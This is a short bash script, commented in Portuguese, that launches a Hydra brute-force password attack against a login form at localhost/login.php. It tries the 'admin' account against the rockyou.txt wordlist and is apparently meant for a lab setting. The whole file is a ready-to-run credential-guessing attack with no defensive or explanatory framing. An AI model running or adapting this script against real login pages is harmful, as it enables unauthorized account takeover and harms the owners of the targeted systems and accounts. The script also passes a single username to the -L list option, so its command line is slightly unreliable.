#!/bin/bash
echo "[INFO] Iniciando ataque de força bruta com Hydra..."

TARGET="http://localhost/login.php"
USERS="admin"
PASSLIST="/usr/share/wordlists/rockyou.txt"

hydra -L $USERS -P $PASSLIST $TARGET http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"

echo "[SUCESSO] Ataque finalizado. Verifique os resultados acima."
